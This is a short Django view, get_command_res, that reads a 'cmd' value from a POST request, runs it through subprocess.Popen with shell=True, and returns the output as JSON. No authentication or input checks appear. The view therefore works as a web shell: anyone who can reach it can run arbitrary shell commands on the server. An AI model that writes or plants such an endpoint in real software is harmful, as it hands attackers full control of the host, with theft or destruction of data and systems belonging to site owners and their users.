import subprocess

from django.http import JsonResponse


# input command and get execute result
def get_command_res(request):
    try:
        command = request.POST.get('cmd')
        process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        output, error = process.communicate()
        result = output.decode().strip() if output else error.decode().strip()
        return JsonResponse({"result": result})
    except Exception as e:
        return JsonResponse({"result": str(e)})

